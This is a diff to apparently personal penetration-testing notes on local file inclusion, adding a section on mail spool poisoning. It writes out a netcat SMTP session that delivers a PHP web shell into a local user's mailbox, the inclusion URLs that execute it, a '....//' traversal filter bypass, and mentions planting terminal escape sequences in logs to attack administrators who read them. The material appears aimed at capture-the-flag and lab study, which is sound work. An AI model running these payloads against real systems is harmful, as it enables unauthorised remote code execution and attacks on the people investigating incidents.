@@ -1,6 +1,6 @@
 # File Inclusion
 
-#LFI #RFI #FileInclusion #RemoteFileInclusion #LocalFileInclusion #PathTraversal #RCE #LogPoisoning #PHPWrappers #FilterChain #ffuf #wfuzz #BurpSuite
+#LFI #RFI #FileInclusion #RemoteFileInclusion #LocalFileInclusion #PathTraversal #RCE #LogPoisoning #MailSpool #PHPWrappers #FilterChain #ffuf #wfuzz #BurpSuite
 
 ## What is this?
 
@@ -415,6 +415,8 @@ echo '<?php system($_GET["cmd"]); ?>' >> legit_image.jpg
 
 Inject PHP into logs → Include log → Code execution
 
+> [!note] Related payload class — **terminal escape injection**. The same log/header write primitives that let you inject PHP also let you plant **ANSI/OSC escape sequences** that attack whoever `cat`s the log later (an incident responder or admin): clipboard hijack, view spoofing, historically command injection. Different target (the *viewer's terminal*, not the web server), same injection point. See [[Tools/Command Shell/Terminator#Terminal Escape Sequence Injection — attacks on the emulator|Terminator → Terminal Escape Injection]].
+
 ### Apache/Nginx Logs
 
 **Locations:**
@@ -534,17 +536,39 @@ ssh '<?php system($_GET["cmd"]); ?>'@target.com
 ?file=/var/log/auth.log&cmd=whoami
 ```
 
-### Mail Logs
+### Mail Spool Poisoning (SMTP → LFI = RCE)
+
+The strongest mail-based vector, and a common HTB foothold (*Trick*). When **port 25** is open, local MTAs (Postfix/Sendmail/exim) deliver mail addressed to a **local system user** into an mbox **spool file** — `/var/mail/<user>` or `/var/spool/mail/<user>` — writing the body **verbatim**. Send a message whose body is PHP, then include the spool file: the mail body executes. Unlike log poisoning, the body isn't mangled by log formatting, so it's clean and reliable when logs aren't readable.
 
 ```bash
-# Locations
-/var/log/mail.log       # Linux
+# 1. Deliver PHP to michael's spool over raw SMTP.
+#    The recipient is a LOCAL user (no domain) — that's why it lands in /var/mail/michael.
+nc <target> 25
+HELO x
+MAIL FROM: a@b.c
+RCPT TO: michael
+DATA
+<?php system($_GET['cmd']); ?>
+.
+QUIT
 
-# Poison via SMTP (send email with PHP payload in subject/body)
-# Less common but worth trying if other logs aren't readable
+# 2. Include the spool file → the PHP in the mail body runs
+?page=/var/mail/michael&cmd=id
 
-# Windows (if SMTP is installed)
-C:\inetpub\mailroot\Pickup\
+# If '../' is stripped non-recursively (e.g. str_replace("../","",$page)), double it up:
+?page=....//....//....//....//var/mail/michael&cmd=id
+```
+
+**Spool locations:** `/var/mail/<user>`, `/var/spool/mail/<user>`. Enumerate valid local users from `/etc/passwd` (via the LFI) or SMTP `VRFY`/`RCPT`.
+Full SMTP side — netcat vs `swaks`, user enumeration: [[SMTP]].
+
+### Mail Logs
+
+Distinct from spool poisoning above — here you inject into the mail *log*, not a delivered message body.
+
+```bash
+/var/log/mail.log             # Linux — poison via a crafted MAIL FROM / HELO / subject, then include
+C:\inetpub\mailroot\Pickup\   # Windows (if SMTP installed)
 ```
 
 ---
@@ -1118,7 +1142,7 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 ### Escalation Paths
 
 1. LFI → Source Code → Find creds/bugs
-2. LFI → Log Poisoning → RCE
+2. LFI → Log Poisoning / SMTP Mail Spool → RCE
 3. LFI + Upload → RCE
 4. LFI → /proc/self/environ → Poison → RCE
 5. LFI → PHP Filter Chain → RCE (no write required, PHP 7.1+)
@@ -1175,5 +1199,5 @@ cat /proc/net/tcp | awk '{print $2}' | grep -v local
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-30*
+*Updated: 2026-08-13*
 *Model: claude-opus-5*
